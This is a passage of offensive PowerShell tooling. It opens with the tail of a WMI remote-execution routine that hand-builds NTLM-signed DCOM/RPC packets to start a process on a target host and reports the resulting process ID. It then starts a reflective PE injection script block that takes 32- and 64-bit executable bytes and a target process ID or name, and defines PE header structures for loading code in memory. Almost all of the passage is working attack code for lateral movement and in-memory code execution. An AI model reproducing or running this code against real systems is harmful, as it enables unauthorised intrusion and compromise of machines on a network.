                                                0x65,0x73,0x73,0x20,0x61,0x6e,0x64,0x20,0x54,0x68,0x72,0x65,0x61,
                                                0x64,0x20,0x46,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e,0x73,0x7c,0x43,
                                                0x72,0x65,0x61,0x74,0x65,0x50,0x72,0x6f,0x63,0x65,0x73,0x73,0x7c,
                                                0x6c,0x70,0x43,0x75,0x72,0x72,0x65,0x6e,0x74,0x44,0x69,0x72,0x65,
                                                0x63,0x74,0x6f,0x72,0x79,0x20,0x00,0x00,0x4d,0x61,0x70,0x70,0x69,
                                                0x6e,0x67,0x53,0x74,0x72,0x69,0x6e,0x67,0x73,0x00,0x08,0x00,0x00,
                                                0x00,0x01,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x29,0x00,
                                                0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0x85,0x01,
                                                0x00,0x00,0xac,0x01,0x00,0x00,0x02,0x0b,0x00,0x00,0x00,0xff,0xff,
                                                0x2b,0x02,0x00,0x00,0x02,0x08,0x20,0x00,0x00,0xda,0x01,0x00,0x00,
                                                0x00,0x49,0x44,0x00,0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x36,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,
                                                0x03,0x08,0x00,0x00,0x00,0xba,0x02,0x00,0x00,0xac,0x01,0x00,0x00,
                                                0x00,0x0b,0x00,0x00,0x00,0xff,0xff,0x2b,0x02,0x00,0x00,0x02,0x08,
                                                0x20,0x00,0x00,0xda,0x01,0x00,0x00,0x72,0x02,0x00,0x00,0x11,0x03,
                                                0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x73,0x74,0x72,0x69,0x6e,
                                                0x67,0x00,0x0d,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x50,0x72,0x6f,0x63,0x65,
                                                0x73,0x73,0x53,0x74,0x61,0x72,0x74,0x75,0x70,0x49,0x6e,0x66,0x6f,
                                                0x72,0x6d,0x61,0x74,0x69,0x6f,0x6e,0x00,0x00,0x6f,0x62,0x6a,0x65,
                                                0x63,0x74,0x00,0x0d,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x11,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,
                                                0x08,0x00,0x00,0x00,0xef,0x02,0x00,0x00,0x00,0x49,0x6e,0x00,0x0d,
                                                0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x1c,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,
                                                0xef,0x02,0x00,0x00,0x16,0x03,0x00,0x00,0x02,0x0b,0x00,0x00,0x00,
                                                0xff,0xff,0x01,0x00,0x00,0x00,0x4c,0x03,0x00,0x00,0x00,0x57,0x4d,
                                                0x49,0x7c,0x57,0x69,0x6e,0x33,0x32,0x5f,0x50,0x72,0x6f,0x63,0x65,
                                                0x73,0x73,0x53,0x74,0x61,0x72,0x74,0x75,0x70,0x00,0x00,0x4d,0x61,
                                                0x70,0x70,0x69,0x6e,0x67,0x53,0x74,0x72,0x69,0x6e,0x67,0x73,0x00,
                                                0x0d,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x29,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,
                                                0x00,0xef,0x02,0x00,0x00,0x16,0x03,0x00,0x00,0x02,0x0b,0x00,0x00,
                                                0x00,0xff,0xff,0x66,0x03,0x00,0x00,0x02,0x08,0x20,0x00,0x00,0x44,
                                                0x03,0x00,0x00,0x00,0x49,0x44,0x00,0x0d,0x00,0x00,0x00,0x02,0x00,
                                                0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x36,0x00,0x00,0x00,0x0a,
                                                0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0xf5,0x03,0x00,0x00,0x16,
                                                0x03,0x00,0x00,0x00,0x0b,0x00,0x00,0x00,0xff,0xff,0x66,0x03,0x00,
                                                0x00,0x02,0x08,0x20,0x00,0x00,0x44,0x03,0x00,0x00,0xad,0x03,0x00,
                                                0x00,0x11,0x03,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x6f,0x62,
                                                0x6a,0x65,0x63,0x74,0x3a,0x57,0x69,0x6e,0x33,0x32,0x5f,0x50,0x72,
                                                0x6f,0x63,0x65,0x73,0x73,0x53,0x74,0x61,0x72,0x74,0x75,0x70 +
                                                (,0x00 * 501) +
                                                $command_length +
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x3c,0x0e,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x01 +
                                                $command_length2 +
                                                0x00,0x80,0x00,0x5f,0x5f,0x50,0x41,0x52,0x41,0x4d,0x45,0x54,0x45,
                                                0x52,0x53,0x00,0x00 +
                                                $command_bytes +
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x02,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00

                                if($Stub_data.Length -lt $request_split_index)
                                {
                                    $request_flags = 0x83
                                    $WMI_client_stage_next = 'Result'
                                }
                                else
                                {
                                    $request_split = $true
                                    $request_split_stage_final = [Math]::Ceiling($stub_data.Length / $request_split_index)

                                    if($request_split_stage -lt 2)
                                    {
                                        $request_length = $stub_data.Length
                                        $stub_data = $stub_data[0..($request_split_index - 1)]
                                        $request_split_stage = 2
                                        $sequence_number_counter = 10
                                        $request_flags = 0x81
                                        $request_split_index_tracker = $request_split_index
                                        $WMI_client_stage_next = 'Request'
                                    }
                                    elseif($request_split_stage -eq $request_split_stage_final)
                                    {
                                        $request_split = $false
                                        $sequence_number = [System.BitConverter]::GetBytes($sequence_number_counter)
                                        $request_split_stage = 0
                                        $stub_data = $stub_data[$request_split_index_tracker..$stub_data.Length]
                                        $request_flags = 0x82
                                        $WMI_client_stage_next = 'Result'
                                    }
                                    else
                                    {
                                        $request_length = $stub_data.Length - $request_split_index_tracker
                                        $stub_data = $stub_data[$request_split_index_tracker..($request_split_index_tracker + $request_split_index - 1)]
                                        $request_split_index_tracker += $request_split_index
                                        $request_split_stage++
                                        $sequence_number = [System.BitConverter]::GetBytes($sequence_number_counter)
                                        $sequence_number_counter++
                                        $request_flags = 0x80
                                        $WMI_client_stage_next = 'Request'
                                    }

                                }

                            }

                        }

                        $packet_RPC = Get-PacketRPCRequest $request_flags $stub_data.Length 16 $request_auth_padding $request_call_ID $request_context_ID $request_opnum $request_UUID

                        if($request_split)
                        {
                            $packet_RPC["RPCRequest_AllocHint"] = [System.BitConverter]::GetBytes($request_length)
                        }

                        $packet_NTLMSSP_verifier = Get-PacketNTLMSSPVerifier $request_auth_padding 0x04 $sequence_number
                        $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
                        $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier
                        $RPC_signature = $HMAC_MD5.ComputeHash($sequence_number + $RPC + $stub_data + $NTLMSSP_verifier[0..($request_auth_padding + 7)])
                        $RPC_signature = $RPC_signature[0..7]
                        $packet_NTLMSSP_verifier["NTLMSSPVerifier_NTLMSSPVerifierChecksum"] = $RPC_signature
                        $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier
                        $WMI_client_send = $RPC + $stub_data + $NTLMSSP_verifier
                        $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
                        $WMI_client_random_port_stream.Flush()

                        if(!$request_split)
                        {
                            $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
                        }

                        while($WMI_client_random_port_stream.DataAvailable)
                        {
                            $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
                            Start-Sleep -m $Sleep
                        }

                        $WMI_client_stage = $WMI_client_stage_next
                    }

                    'Result'
                    {

                        while($WMI_client_random_port_stream.DataAvailable)
                        {
                            $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
                            Start-Sleep -m $Sleep
                        }

                        if($WMI_client_receive[1145] -ne 9)
                        {
                            $target_process_ID = DataLength2 1141 $WMI_client_receive
                            Write-Output "Command executed with process ID $target_process_ID on $target_long"
                        }
                        else
                        {
                            Write-Output "Process did not start, check your command"
                        }

                        $WMI_client_stage = 'exit'
                    }

                }

                Start-Sleep -m $Sleep

            }

            $WMI_client_random_port.Close()
            $WMI_client_random_port_stream.Close()
        }

        $WMI_client.Close()
        $WMI_client_stream.Close()
    }

}

}
$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$PEBytes64,

        [Parameter(Position = 1, Mandatory = $true)]
		[String]
		$PEBytes32,

		[Parameter(Position = 2, Mandatory = $false)]
		[String]
		$FuncReturnType,

		[Parameter(Position = 3, Mandatory = $false)]
		[Int32]
		$ProcId,

		[Parameter(Position = 4, Mandatory = $false)]
		[String]
		$ProcName,

        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $ExeArgs
	)

	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]

		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64

		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
